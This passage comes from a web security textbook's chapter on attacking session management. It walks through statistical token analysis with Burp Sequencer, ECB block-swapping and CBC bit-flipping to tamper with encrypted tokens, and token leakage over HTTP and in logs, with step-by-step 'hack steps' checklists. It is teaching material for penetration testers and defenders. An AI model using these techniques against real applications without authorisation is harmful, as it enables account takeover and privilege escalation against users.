unnecessary to capture\nfurther tokens. Otherwise, you should continue capturing tokens and re-perform\nthe analysis periodically. If you capture 5,000 tokens that are shown to pass the\nrandomness tests, you may decide that this is suffi cient. However, to achieve\ncompliance with the formal FIPS tests for randomness, you need to obtain a\nsample of 20,000 tokens. This is the largest sample size that Burp supports. Burp Sequencer performs the statistical tests at character level and bit level. The results of all tests are aggregated to give an overall estimate of the number\ncc0077..iinndddd 222200 88//1199//22001111 1122::0077::4400 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 221\nChapter 7 n Attacking Session Management 221\nof bits of effective entropy within the token; this the key result to consider. However, you can also drill down into the results of each test to understand\nexactly how and why different parts of the token passed or failed each test, as\nshown in Figure 7-3. The methodology used for each type of test is described\nbeneath the test results. Figure 7-3: Analyzing the Burp Sequencer results to understand the properties of\nthe tokens that were tested\nNote that Burp performs all tests individually on each character and bit of data\nwithin the token. In many cases, you will fi nd that large parts of a structured\ntoken are not random; this in itself may not present any kind of weakness. What\nmatters is that the token contains a suffi cient number of bits that do pass the\nrandomness tests. For example, if a large token contains 1,000 bits of informa-\ntion, and only 50 of these bits pass the randomness tests, the token as a whole\nis no less robust than a 50-bit token that fully passes the tests. cc0077..iinndddd 222211 88//1199//22001111 1122::0077::4400 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 222\n222 Chapter 7 n Attacking Session Management\nNOTE Keep in mind two important caveats when performing statisti-\ncal tests for randomness. These caveats affect the correct interpretation of\nthe test results and their consequences for the application’s security pos-\nture. First, tokens that are generated in a completely deterministic way may\npass the statistical tests for randomness. For example, a linear congruential\npseudorandom number generator, or an algorithm that computes the hash\nof a sequential number, may produce output that passes the tests. Yet an\nattacker who knows the algorithm and the internal state of the generator can\nextrapolate its output with complete reliability in both forward and reverse\ndirections. Second, tokens that fail the statistical tests for randomness may not actu-\nally be predictable in any practical situation. If a given bit of a token fails the\ntests, this means only that the sequence of bits observed at that position con-\ntains characteristics that are unlikely to occur in a genuinely random token. But attempting to predict the value of that bit in the next token, based on the\nobserved characteristics, may be little more reliable than blind guesswork. Multiplying this unreliability across a large number of bits that need to be\npredicted simultaneously may mean that the probability of making a correct\nprediction is extremely low.\n\nHACK STEPS\n1. Determine when and how session tokens are issued by walking through\nthe application from the first application page through any login func-\ntions. Two behaviors are common:\nn The application creates a new session anytime a request is received that\ndoes not submit a token.\nn The application creates a new session following a successful login.\nTo harvest large numbers of tokens in an automated way, ideally identify\na single request (typically either GET/ or a login submission) that causes\na new token to be issued.\n2. In Burp Suite, send the request that creates a new session to Burp\nSequencer, and configure the token’s location. Then start a live capture\nto gather as many tokens as is feasible. If a custom session management\nmechanism is in use, and you only have remote access to the application,\ngather the tokens as quickly as possible to minimize the loss of tokens\nissued to other users and reduce the influence of any time dependency.\n3. If a commercial session management mechanism is in use and/or you\nhave local access to the application, you can obtain indefinitely large\nsequences of session tokens in controlled conditions.\ncc0077..iinndddd 222222 88//1199//22001111 1122::0077::4411 PPMM\n\nStuttard c07.indd V3 - 07/22/2011 Page 223\nChapter 7 n Attacking Session Management 223\n4. While Burp Sequencer is capturing tokens, enable the “auto analyse” set-\nting so that Burp automatically performs the statistical analysis periodi-\ncally. Collect at least 500 tokens before reviewing the results in any detail.\nIf a sufficient number of bits within the token have passed the tests,\ncontinue gathering tokens for as long as is feasible, reviewing the analysis\nresults as further tokens are captured.\n5. If the tokens fail the randomness tests and appear to contain patterns\nthat could be exploited to predict future tokens, reperform the exercise\nfrom a different IP address and (if relevant) a different username. This\nwill help you identify whether the same pattern is detected and whether\ntokens received in the first exercise could be extrapolated to identify\ntokens received in the second. Sometimes the sequence of tokens cap-\ntured by one user manifests a pattern. But this will not allow straight-\nforward extrapolation to the tokens issued to other users, because\ninformation such as source IP is used as a source of entropy (such as a\nseed to a random number generator).\n6. If you believe you have enough insight into the token generation algo-\nrithm to mount an automated attack against other users’ sessions, it is\nlikely that the best means of achieving this is via a customized script.\nThis can generate tokens using the specific patterns you have observed\nand apply any necessary encoding. See Chapter 14 for some generic tech-\nniques for applying automation to this type of problem.\n7. If source code is available, closely review the code responsible for gener-\nating session tokens to understand the mechanism used and determine\nwhether it is vulnerable to prediction. If entropy is drawn from data that\ncan be determined within the application within a brute-forcible range,\nconsider the practical number of requests that would be needed to brute-\nforce an application token.\nTRY IT!\nhttp://mdsec.net/auth/361/\nEncrypted Tokens\nSome applications use tokens that contain meaningful information about the\nuser and seek to avoid the obvious problems that this entails by encrypting the\ntokens before they are issued to users. Since the tokens are encrypted using a\nsecret key that is unknown to users, this appears to be a robust approach, because\nusers will be unable to decrypt the tokens and tamper with their contents.\ncc0077..iinndddd 222233 88//1199//22001111 1122::0077::4411 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 224\n224 Chapter 7 n Attacking Session Management\nHowever, in some situations, depending on the encryption algorithm used and\nthe manner in which the application processes the tokens, it may nonetheless be\npossible for users to tamper with the tokens’ meaningful contents without actu-\nally decrypting them. Bizarre as it may sound, these are actually viable attacks\nthat are sometimes easy to deliver, and numerous real-world applications have\nproven vulnerable to them. The kinds of attacks that are applicable depend on\nthe exact cryptographic algorithm that is being used.\nECB Ciphers\nApplications that employ encrypted tokens use a symmetric encryption algorithm\nso that tokens received from users can be decrypted to recover their meaningful\ncontents. Some symmetric encryption algorithms use an “electronic codebook”\n(ECB) cipher. This type of cipher divides plaintext into equal-sized blocks (such\nas 8 bytes each) and encrypts each block using the secret key. During decryp-\ntion, each block of ciphertext is decrypted using the same key to recover the\noriginal block of plaintext. One feature of this method is that patterns within the\nplaintext can result in patterns within the ciphertext, because identical blocks of\nplaintext will be encrypted into identical blocks of ciphertext. For some types\nof data, such as bitmap images, this means that meaningful information from\nthe plaintext can be discerned within the ciphertext, as illustrated in Figure 7-4.\nFigure 7-4: Patterns within plaintext that\nis encrypted using an ECB cipher may be\nvisible within the resulting ciphertext.\nIn spite of this shortcoming with ECB, these ciphers are often used for encrypt-\ning information within web applications. Even in situations where the problem\nof patterns within plaintext does not arise, vulnerabilities can still exist. This\nis because of the cipher’s behavior of encrypting identical plaintext blocks into\nidentical ciphertext blocks.\nConsider an application whose tokens contain several different meaningful\ncomponents, including a numeric user identifi er:\nrnd=2458992;app=iTradeEUR_1;uid=218;username=dafydd;time=634430423694715\n000;\ncc0077..iinndddd 222244 88//1199//22001111 1122::0077::4411 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 225\nChapter 7 n Attacking Session Management 225\nWhen this token is encrypted, it is apparently meaningless and is likely to pass\nall standard statistical tests for randomness:\n68BAC980742B9EF80A27CBBBC0618E3876FF3D6C6E6A7B9CB8FCA486F9E11922776F0307\n329140AABD223F003A8309DDB6B970C47BA2E249A0670592D74BCD07D51A3E150EFC2E69\n885A5C8131E4210F\nThe ECB cipher being employed operates on 8-byte blocks of data, and the\nblocks of plaintext map to the corresponding blocks of ciphertext as follows:\nrnd=2458 68BAC980742B9EF8\n992;app= 0A27CBBBC0618E38\niTradeEU 76FF3D6C6E6A7B9C\nR_1;uid= B8FCA486F9E11922\n218;user 776F0307329140AA\nname=daf BD223F003A8309DD\nydd;time B6B970C47BA2E249\n=6344304 A0670592D74BCD07\n23694715 D51A3E150EFC2E69\n000; 885A5C8131E4210F\nNow, because each block of ciphertext will always decrypt into the same\nblock of plaintext, it is possible for an attacker to manipulate the sequence of\nciphertext blocks so as to modify the corresponding plaintext in meaning-\nful ways. Depending on how exactly the application processes the resulting\ndecrypted token, this may enable the attacker to switch to a different user or\nescalate privileges.\nFor example, if the second block is duplicated following the fourth block, the\nsequence of blocks will be as follows:\nrnd=2458 68BAC980742B9EF8\n992;app= 0A27CBBBC0618E38\niTradeEU 76FF3D6C6E6A7B9C\nR_1;uid= B8FCA486F9E11922\n992;app= 0A27CBBBC0618E38\n218;user 776F0307329140AA\nname=daf BD223F003A8309DD\nydd;time B6B970C47BA2E249\n=6344304 A0670592D74BCD07\n23694715 D51A3E150EFC2E69\n000; 885A5C8131E4210F\nThe decrypted token now contains a modifi ed uid value, and also a duplicated\napp value. Exactly what happens depends on how the application processes\nthe decrypted token. Often, applications using tokens in this way inspect only\ncertain parts of the decrypted token, such as the user identifi er. If the applica-\ntion behaves like this, then it will process the request in the context of the user\nwho has a uid of 992, rather than the original 218.\ncc0077..iinndddd 222255 88//1199//22001111 1122::0077::4411 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 226\n226 Chapter 7 n Attacking Session Management\nThe attack just described would depend on being issued with a suitable rnd\nvalue that corresponds to a valid uid value when the blocks are manipulated.\nAn alternative and more reliable attack would be to register a username con-\ntaining a numeric value at the appropriate offset, and duplicate this block so as\nto replace the existing uid value. Suppose you register the username daf1, and\nare issued with the following token:\n9A5A47BF9B3B6603708F9DEAD67C7F4C76FF3D6C6E6A7B9CB8FCA486F9E11922A5BC430A\n73B38C14BD223F003A8309DDF29A5A6F0DC06C53905B5366F5F4684C0D2BBBB08BD834BB\n\nADEBC07FFE87819D\nThe blocks of plaintext and ciphertext for this token are as follows:\nrnd=9224 9A5A47BF9B3B6603\n856;app= 708F9DEAD67C7F4C\niTradeEU 76FF3D6C6E6A7B9C\nR_1;uid= B8FCA486F9E11922\n219;user A5BC430A73B38C14\nname=daf BD223F003A8309DD\n1;time=6 F29A5A6F0DC06C53\n34430503 905B5366F5F4684C\n61065250 0D2BBBB08BD834BB\n0; ADEBC07FFE87819D\nIf you then duplicate the seventh block following the fourth block, your\ndecrypted token will contain a uid value of 1:\nrnd=9224 9A5A47BF9B3B6603\n856;app= 708F9DEAD67C7F4C\niTradeEU 76FF3D6C6E6A7B9C\nR_1;uid= B8FCA486F9E11922\n1;time=6 F29A5A6F0DC06C53\n219;user A5BC430A73B38C14\nname=daf BD223F003A8309DD\n1;time=6 F29A5A6F0DC06C53\n34430503 905B5366F5F4684C\n61065250 0D2BBBB08BD834BB\n0; ADEBC07FFE87819D\nBy registering a suitable range of usernames and reperforming this attack,\nyou could potentially cycle through the entire range of valid uid values, and\nso masquerade as every user of the application. TRY IT! http://mdsec.net/auth/363/\ncc0077..iinndddd 222266 88//1199//22001111 1122::0077::4411 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 227\nChapter 7 n Attacking Session Management 227\nCBC Ciphers\nThe shortcomings in ECB ciphers led to the development of cipher block chaining\n(CBC) ciphers. With a CBC cipher, before each block of plaintext is encrypted\nit is XORed against the preceding block of ciphertext, as shown in Figure 7-5. This prevents identical plaintext blocks from being encrypted into identical\nciphertext blocks. During decryption, the XOR operation is applied in reverse,\nand each decrypted block is XORed against the preceding block of ciphertext\nto recover the original plaintext. Plaintext Plaintext Plaintext\nInitialization Vector (IV)\nBlock Cipher Block Cipher Block Cipher\nKey Key Key\nEncryption Encryption Encryption\nCiphertext Ciphertext Ciphertext\nFigure 7-5: In a CBC cipher, each block of plaintext is XORed against the preceding\nblock of ciphertext before being encrypted. Because CBC ciphers avoid some of the problems with ECB ciphers, standard\nsymmetric encryption algorithms such as DES and AES frequently are used\nin CBC mode. However, the way in which CBC-encrypted tokens are often\nemployed in web applications means that an attacker may be able to manipulate\nparts of the decrypted tokens without knowing the secret key. Consider a variation on the preceding application whose tokens contain\nseveral different meaningful components, including a numeric user identifi er:\nrnd=191432758301;app=eBankProdTC;uid=216;time=6343303;\nAs before, when this information is encrypted, it results in an apparently mean-\ningless token:\n0FB1F1AFB4C874E695AAFC9AA4C2269D3E8E66BBA9B2829B173F255D447C51321586257C\n6E459A93635636F45D7B1A43163201477\nBecause this token is encrypted using a CBC cipher, when the token is decrypted,\neach block of ciphertext is XORed against the following block of decrypted text\nto obtain the plaintext. Now, if an attacker modifi es parts of the ciphertext (the\ntoken he received), this causes that specifi c block to decrypt into junk. However, it\nalso causes the following block of decrypted text to be XORed against a different\ncc0077..iinndddd 222277 88//1199//22001111 1122::0077::4411 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 228\n228 Chapter 7 n Attacking Session Management\nvalue, resulting in modifi ed but still meaningful plaintext. In other words, by\nmanipulating a single individual block of the token, the attacker can systemati-\ncally modify the decrypted contents of the block that follows it. Depending on\nhow the application processes the resulting decrypted token, this may enable\nthe attacker to switch to a different user or escalate privileges. Let’s see how. In the example described, the attacker works through the\nencrypted token, changing one character at a time in arbitrary ways and send-\ning each modifi ed token to the application. This involves a large number of\nrequests. The following is a selection of the values that result when the applica-\ntion decrypts each modifi ed token:\n????????32858301;app=eBankProdTC;uid=216;time=6343303;\n????????32758321;app=eBankProdTC;uid=216;time=6343303;\nrnd=1914????????;aqp=eBankProdTC;uid=216;time=6343303;\nrnd=1914????????;app=eAankProdTC;uid=216;time=6343303;\nrnd=191432758301????????nkPqodTC;uid=216;time=6343303;\nrnd=191432758301????????nkProdUC;uid=216;time=6343303;\nrnd=191432758301;app=eBa????????;uie=216;time=6343303;\nrnd=191432758301;app=eBa????????;uid=226;time=6343303;\nrnd=191432758301;app=eBankProdTC????????;timd=6343303;\nrnd=191432758301;app=eBankProdTC????????;time=6343503;\nIn each case, the block that the attacker has modifi ed decrypts into junk, as\nexpected (indicated by ????????). However, the following block decrypts into\nmeaningful text that differs slightly from the original token. As already described,\nthis difference occurs because the decrypted text is XORed against the preced-\ning block of ciphertext, which the attacker has slightly modifi ed. Although the attacker does not see the decrypted values, the application\nattempts to process them, and the attacker sees the results in the application’s\nresponses. Exactly what happens depends on how the application handles the\npart of the decrypted token that has been corrupted. If the application rejects\ntokens containing any invalid data, the attack fails. Often, however, applica-\ntions using tokens in this way inspect only certain parts of the decrypted\ntoken, such as the user identifi er. If the application behaves like this, then\nthe eighth example shown in the preceding list succeeds, and the application\nprocesses the request in the context of the user who has a uid of 226, rather\nthan the original 216. You can easily test applications for this vulnerability using the “bit fl ip-\nper” payload type in Burp Intruder. First, you need to log in to the applica-\ntion using your own account. Then you fi nd a page of the application that\ndepends on a logged-in session and shows the identity of the logged-in user\nwithin the response. Typically, the user’s home landing page or account details\npage serves this purpose. Figure 7-6 shows Burp Intruder set up to target the\nuser’s home page, with the encrypted session token marked as a payload\nposition. cc0077..iinndddd 222288 88//1199//22001111 1122::0077::4411 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 229\nChapter 7 n Attacking Session Management 229\nFigure 7-6: Configuring Burp Intruder to modify an encrypted session token\nFigure 7-7 shows the required payload confi guration. It tells Burp to oper-\nate on the token’s original value, treating it as ASCII-encoded hex, and to fl ip\neach bit at each character position. This approach is ideal because it requires a\nrelatively small number of requests (eight requests per byte of data in the token)\nand almost always identifi es whether the application is vulnerable. This allows\nyou to use a more focused attack to perform actual exploitation. When the attack is executed, the initial requests do not cause any noticeable\nchange in the application’s responses, and the user’s session is still intact. This\nis interesting in itself, because it indicates that the fi rst part of the token is not\nbeing used to identify the logged-in user. Many of the requests later in the attack\ncause a redirection to the login page, indicating that modifi cation has invali-\ndated the token in some way. Crucially, there is also a run of requests where\nthe response appears to be part of a valid session but is not associated with the\noriginal user identity. This corresponds to the block of the token that contains\nthe uid value. In some cases, the application simply displays “unknown user,”\nindicating that the modifi ed uid did not correspond to an actual user, and so the\nattack failed. In other cases, it shows the name of a different registered user of\nthe application, proving conclusively that the attack has succeeded. Figure 7-8\nshows the results of the attack. Here we have defi ned an extract grep column\nto display the identity of the logged-in user and have set a fi lter to hide the\nresponses that are redirections to the login page. cc0077..iinndddd 222299 88//1199//22001111 1122::0077::4411 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 230\n230 Chapter 7 n Attacking Session Management\nFigure 7-7: Configuring Burp Intruder to flip each bit in the encrypted token\nFigure 7-8: A successful bit flipping attack against an encrypted token\ncc0077..iinndddd 223300 88//1199//22001111 1122::0077::4422 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 231\nChapter 7 n Attacking Session Management 231\nHaving identifi ed the vulnerability, you can proceed to exploit it with a more\nfocused attack. To do this, you would determine from the results exactly which\nblock of the encrypted token is being tampered with when the user context\nchanges. Then you would deliver an attack that tests numerous further val-\nues within this block. You could use the numbers payload type within Burp\nIntruder to do this. TRY IT! http://mdsec.net/auth/365/\nNOTE Some applications use the technique of encrypting meaningful data\nwithin request parameters more generally in an attempt to prevent tampering\nof data, such as the prices of shopping items. In any location where you see\napparently encrypted data that plays a key role in application functionality, you\nshould try the bit-fl ipping technique to see whether you can manipulate the\nencrypted information in a meaningful way to interfere with application logic.\n\nIn seeking to exploit the vulnerability described in this section, your objec-\ntive would of course be to masquerade as different application users — ideally\nan administrative user with higher privileges. If you are restricted to blindly\nmanipulating parts of an encrypted token, this may require a degree of luck. However, in some cases the application may give you more assistance. When\nan application employs symmetric encryption to protect data from tampering\nby users, it is common for the same encryption algorithm and key to be used\nthroughout the application. In this situation, if any application function discloses\nto the user the decrypted value of an arbitrary encrypted string, this can be\nleveraged to fully decrypt any item of protected information. One application observed by the authors contained a fi le upload/download\nfunction. Having uploaded a fi le, users were given a download link containing\na fi lename parameter. To prevent various attacks that manipulate fi le paths, the\napplication encrypted the fi lename within this parameter. However, if a user\nrequested a fi le that had been deleted, the application displayed an error mes-\nsage showing the decrypted name of the requested fi le. This behavior could be\nleveraged to fi nd the plaintext value of any encrypted string used within the\napplication, including the values of session tokens. The session tokens were\nfound to contain various meaningful values in a structured format that was\nvulnerable to the type of attack described in this section. Because these values\nincluded textual usernames and application roles, rather than numeric identi-\nfi ers, it would have been extremely diffi cult to perform a successful exploit using\nonly blind bit fl ipping. However, using the fi lename decryptor function, it was\npossible to systematically manipulate bits of a token while viewing the results. cc0077..iinndddd 223311 88//1199//22001111 1122::0077::4422 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 232\n232 Chapter 7 n Attacking Session Management\nThis allowed the construction of a token that, when decrypted, specifi ed a valid\nuser and administrative role, enabling full control of the application. NOTE Other techniques may allow you to decrypt encrypted data used by\nthe application. A “reveal” encryption oracle can be abused to obtain the\ncleartext value of an encrypted token. Although this can be a signifi cant\nvulnerability when decrypting a password, decrypting a session token does\nnot provide an immediate means of compromising other users’ sessions. Nevertheless, the decrypted token provides useful insight into the cleartext\nstructure, which is useful in conducting a targeted bit-fl ipping attack. See\nChapter 11 for more details about “reveal” encryption oracle attacks. Side channel attacks against padding oracles may be used to compromise\nencrypted tokens. See Chapter 18 for more details.\n\nHACK STEPS\nIn many situations where encrypted tokens are used, actual exploitability may\ndepend on various factors, including the offsets of block boundaries relative\nto the data you need to attack, and the application’s tolerance of the changes\nthat you cause to the surrounding plaintext structure. Working completely\nblind, it may appear diffi cult to construct an effective attack, however in many\nsituations this is in fact possible.\n1. Unless the session token is obviously meaningful or sequential in itself,\nalways consider the possibility that it might be encrypted. You can often\nidentify that a block-based cipher is being used by registering several dif-\nferent usernames and adding one character in length each time. If you\nfind a point where adding one character results in your session token\njumping in length by 8 or 16 bytes, then a block cipher is probably being\nused. You can confirm this by continuing to add bytes to your username,\nand looking for the same jump occurring 8 or 16 bytes later.\n2. ECB cipher manipulation vulnerabilities are normally difficult to identify\nand exploit in a purely black-box context. You can try blindly duplicat-\ning and moving the ciphertext blocks within your token, and reviewing\nwhether you remain logged in to the application within your own user\ncontext, or that of another user, or none at all.\n3. You can test for CBC cipher manipulation vulnerabilities by running a Burp\nIntruder attack over the whole token, using the “bit flipping” payload\nsource. If the bit flipping attack identifies a section within the token, the\nmanipulation of which causes you to remain in a valid session, but as a\ndifferent or nonexistent user, perform a more focused attack on just this\nsection, trying a wider range of values at each position.\ncc0077..iinndddd 223322 88//1199//22001111 1122::0077::4422 PPMM\n\nStuttard c07.indd V3 - 07/22/2011 Page 233\nChapter 7 n Attacking Session Management 233\n4. During both attacks, monitor the application’s responses to identify the\nuser associated with your session following each request, and try to\nexploit any opportunities for privilege escalation that may result.\n5. If your attacks are unsuccessful, but it appears from step 1 that variable-\nlength input that you control is being incorporated into the token, you\nshould try generating a series of tokens by adding one character at a time,\nat least up to the size of blocks being used. For each resulting token, you\nshould reperform steps 2 and 3. This will increase the chance that the\ndata you need to modify is suitably aligned with block boundaries for\nyour attack to succeed.\nWeaknesses in Session Token Handling\nNo matter how effective an application is at ensuring that the session tokens it\ngenerates do not contain any meaningful information and are not susceptible\nto analysis or prediction, its session mechanism will be wide open to attack if\nthose tokens are not handled carefully after generation. For example, if tokens\nare disclosed to an attacker via some means, the attacker can hijack user ses-\nsions even if predicting the tokens is impossible.\nAn application’s unsafe handling of tokens can make it vulnerable to attack\nin several ways.\n\nCOMMON MYTH\n“Our token is secure from disclosure to third parties because we use SSL.”\nProper use of SSL certainly helps protect session tokens from being cap-\ntured. But various mistakes can still result in tokens being transmitted in\ncleartext even when SSL is in place. And various direct attacks against end\nusers can be used to obtain their tokens.\n\nCOMMON MYTH\n“Our token is generated by the platform using mature, cryptographically\nsound technologies, so it is not vulnerable to compromise.”\nAn application server’s default behavior is often to create a session cookie\nwhen the user fi rst visits the site and to keep this available for the user’s\nentire interaction with the site. As described in the following sections, this\nmay lead to various security vulnerabilities in how the token is handled.\ncc0077..iinndddd 223333 88//1199//22001111 1122::0077::4422 PPMM\n\nStuttard c07.indd V3 - 07/22/2011 Page 234\n234 Chapter 7 n Attacking Session Management\nDisclosure of Tokens on the Network\nThis area of vulnerability arises when the session token is transmitted across\nthe network in unencrypted form, enabling a suitably positioned eavesdropper\nto obtain the token and therefore masquerade as the legitimate user. Suitable\npositions for eavesdropping include the user’s local network, within the user’s IT\ndepartment, within the user’s ISP, on the Internet backbone, within the application’s\nISP, and within the IT department of the organization hosting the application. In\neach case, this includes both authorized personnel of the relevant organization\nand any external attackers who have compromised the infrastructure concerned.\nIn the simplest case, where an application uses an unencrypted HTTP connec-\ntion for communications, an attacker can capture all data transmitted between\nclient and server, including login credentials, personal information, payment\ndetails, and so on. In this situation, an attack against the user’s session is often\nunnecessary because the attacker can already view privileged information\nand can log in using captured credentials to perform other malicious actions.\nHowever, there may still be instances where the user’s session is the primary\ntarget. For example, if the captured credentials are insuffi cient to perform a\nsecond login (for example, in a banking application, they may include a number\ndisplayed on a changing physical token, or specifi c digits from the user’s PIN),\nthe attacker may need to hijack the eavesdropped session to perform arbitrary\nactions. Or if logins are audited closely, and the user is notifi ed of each suc-\ncessful login, an attacker may want to avoid performing his own login to be as\nstealthy as possible.\nIn other cases, an application may use HTTPS to protect key client-server\ncommunications yet may still be vulnerable to interception of session tokens\non the network. This weakness may occur in various ways, many of which can\narise specifi cally when HTTP cookies are used as the transmission mechanism\nfor session tokens:\nn Some applications elect to use HTTPS to protect the user’s credentials\nduring login but then revert to HTTP for the remainder of the user’s ses-\nsion. Many web mail applications behave in this way. In this situation, an\neavesdropper cannot intercept the user’s credentials but may still capture\nthe session token. The Firesheep tool, released as a plug-in for Firefox,\nmakes this an easy process.\nn Some applications use HTTP for preauthenticated areas of the site, such\nas the site’s front page, but switch to HTTPS from the login page onward.\nHowever, in many cases the user is issued a session token at the fi rst page\nvisited, and this token is not modifi ed when the user logs in. The user’s\nsession, which is originally unauthenticated, is upgraded to an authenti-\ncated session after login. In this situation an eavesdropper can intercept a\nuser’s token before login, wait for the user’s communications to switch to\ncc0077..iinndddd 223344 88//1199//22001111 1122::0077::4422 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 235\nChapter 7 n Attacking Session Management 235\nHTTPS, indicating that the user is logging in, and then attempt to access\na protected page (such as My Account) using that token.\nn Even if the application issues a fresh token following successful login,\nand uses HTTPS from the login page onward, the token for the user’s\nauthenticated session may still be disclosed. This can happen if the user\nrevisits a preauthentication page (such as Help or About), either by fol-\nlowing links within the authenticated area, by using the back button, or\nby typing the URL directly.\nn In a variation on the preceding case, the application may attempt to switch\nto HTTPS when the user clicks the Login link. However, it may still accept\na login over HTTP if the user modifi es the URL accordingly. In this situa-\ntion, a suitably positioned attacker can modify the pages returned in the\npreauthenticated areas of the site so that the Login link points to an HTTP\npage. Even if the application issues a fresh session token after success-\nful login, the attacker may still intercept this token if he has successfully\ndowngraded the user’s connection to HTTP.\nn Some applications use HTTP for all static content within the application,\nsuch as images, scripts, style sheets, and page templates. This behavior\nis often indicated by a warning within the user’s browser, as shown in\nFigure 7-9. When a browser shows this warning, it has already retrieved\nthe relevant item over HTTP, so the session token has already been trans-\nmitted. The purpose of the browser’s warning is to let the user decline\nto process response data that has been received over HTTP and so may\nbe tainted. As described previously, an attacker can intercept the user’s\nsession token when the user’s browser accesses a resource over HTTP and\nuse this token to access protected, nonstatic areas of the site over HTTPS.\nFigure 7-9: Browsers present a warning when a\npage accessed over HTTPS contains items accessed\nover HTTP.\nn Even if an application uses HTTPS for every page, including unauthenti-\ncated areas of the site and static content, there may still be circumstances\nin which users’ tokens are transmitted over HTTP. If an attacker can\nsomehow induce a user to make a request over HTTP (either to the HTTP\ncc0077..iinndddd 223355 88//1199//22001111 1122::0077::4422 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 236\n236 Chapter 7 n Attacking Session Management\nservice on the same server if one is running or to http://server:443/\notherwise), his token may be submitted. Means by which the attacker\nmay attempt this include sending the user a URL in an e-mail or instant\nmessage, placing autoloading links into a website the attacker controls,\nor using clickable banner ads. (See Chapters 12 and 13 for more details\nabout techniques of this kind for delivering attacks against other users.)\n\nHACK STEPS\n1. Walk through the application in the normal way from first access (the\n“start” URL), through the login process, and then through all of the appli-\ncation’s functionality. Keep a record of every URL visited, and note every\ninstance in which a new session token is received. Pay particular atten-\ntion to login functions and transitions between HTTP and HTTPS com-\nmunications. This can be achieved manually using a network sniffer such\nas Wireshark or partially automated using the logging functions of your\nintercepting proxy, as shown in Figure 7-10.\nFigure 7-10: Walking through an application to identify locations where new\nsession tokens are received.\n2. If HTTP cookies are being used as the transmission mechanism for session\ntokens, verify whether the secure flag is set, preventing them from ever\nbeing transmitted over unencrypted connections.\n3. Determine whether, in the normal use of the application, session tokens\nare ever transmitted over an unencrypted connection. If so, they should be\nregarded as vulnerable to interception.\n4. Where the start page uses HTTP, and the application switches to HTTPS\nfor the login and authenticated areas of the site, verify whether a new\ntoken is issued following login, or whether a token transmitted during the\nHTTP stage is still being used to track the user’s authenticated session.\nAlso verify whether the application will accept login over HTTP if the login\nURL is modified accordingly.\ncc0077..iinndddd 223366 88//1199//22001111 1122::0077::4433 PPMM\n\nStuttard c07.indd V3 - 07/22/2011 Page 237\nChapter 7 n Attacking Session Management 237\n5. Even if the application uses HTTPS for every page, verify whether the\nserver is also listening on port 80, running any service or content. If so,\nvisit any HTTP URL directly from within an authenticated session, and\nverify whether the session token is transmitted.\n6. In cases where a token for an authenticated session is transmitted to the\nserver over HTTP, verify whether that token continues to be valid or is\nimmediately terminated by the server.\nTRY IT!\nhttp://mdsec.net/auth/369/\nhttp://mdsec.net/auth/372/\nhttp://mdsec.net/auth/374/\nDisclosure of Tokens in Logs\nAside from the clear-text transmission of session tokens in network communica-\ntions, the most common place where tokens are simply disclosed to unauthorized\nview is in system logs of various kinds. Although it is a rarer occurrence, the\nconsequences of this kind of disclosure are usually more serious. Those logs\nmay be viewed by a far wider range of potential attackers, not just by someone\nwho is suitably positioned to eavesdrop on the network.\nMany applications provide functionality for administrators and other sup-\nport personnel to monitor and control aspects of the application’s runtime state,\nincluding user sessions. For example, a helpdesk worker assisting a user who is\nhaving problems may ask for her username, locate her current session through\na list or search function, and view relevant details about the session. Or an\nadministrator may consult a log of recent sessions in the course of investigat-\ning a security breach. Often, this kind of monitoring and control functionality\ndiscloses the actual session token associated with each session. And often, the\nfunctionality is poorly protected, allowing unauthorized users to access the list\nof current session tokens, and thereby hijack the sessions of all application users.\nThe other main cause of session tokens appearing in system logs is where an\napplication uses the URL query string as a mechanism for transmitting tokens,\nas opposed to using HTTP cookies or the body of POST requests. For example,\nGoogling inurl:jsessionid identifi es thousands of applications that transmit\nthe Java platform session token (called jsessionid) within the URL:\nhttp://www.webjunction.org/do/Navigation;jsessionid=\nF27ED2A6AAE4C6DA409A3044E79B8B48?category=327\ncc0077..iinndddd 223377 88//1199//22001111 1122::0077::4433 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 238\n238 Chapter 7 n Attacking Session Management\nWhen applications transmit their session tokens in this way, it is likely that\ntheir session tokens will appear in various system logs to which unauthorized\nparties may have access:\nn Users’ browser logs\nn Web server logs\nn Logs of corporate or ISP proxy servers\nn Logs of any reverse proxies employed within the application’s hosting\nenvironment\nn The Referer logs of any servers that application users visit by following\noff-site links, as shown in Figure 7-11\nSome of these vulnerabilities arise even if HTTPS is used throughout the\napplication.\nFigure 7-11: When session tokens appear in URLs, these are transmitted in the\nReferer header when users follow an off-site link or their browser loads an off-\nsite resource.\nThe fi nal case just described presents an attacker with a highly effective\nmeans of capturing session tokens in some applications. For example, if a\nweb mail application transmits session tokens within the URL, an attacker\ncan send e-mails to users of the application containing a link to a web server\nhe controls. If any user accesses the link (because she clicks it, or because\nher browser loads images contained within HTML-formatted e-mail), the\nattacker receives, in real time, the user’s session token. The attacker can run\na simple script on his server to hijack the session of every token received and\ncc0077..iinndddd 223388 88//1199//22001111 1122::0077::4433 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 239\nChapter 7 n Attacking Session Management 239\nperform some malicious action, such as send spam e-mail, harvest personal\ninformation, or change passwords.\nNOTE Current versions of Internet Explorer do not include a Referer header\nwhen following off-site links contained in a page that was accessed over\nHTTPS. In this situation, Firefox includes the Referer header provided that the\noff-site link is also being accessed over HTTPS, even if it belongs to a differ-\nent domain. Hence, sensitive data placed in URLs is vulnerable to leakage in\nReferer logs even where SSL is being used.\n\nHACK STEPS\n1. Identify all the functionality within the application, and locate any log-\nging or monitoring functions where session tokens can be viewed. Verify\nwho can access this functionality–for example, administrators, any\nauthenticated user, or any anonymous user. See Chapter 4 for techniques\nfor discovering hidden content that is not directly linked from the main\napplication.\n2. Identify any instances within the application where session tokens are\ntransmitted within the URL. It may be that 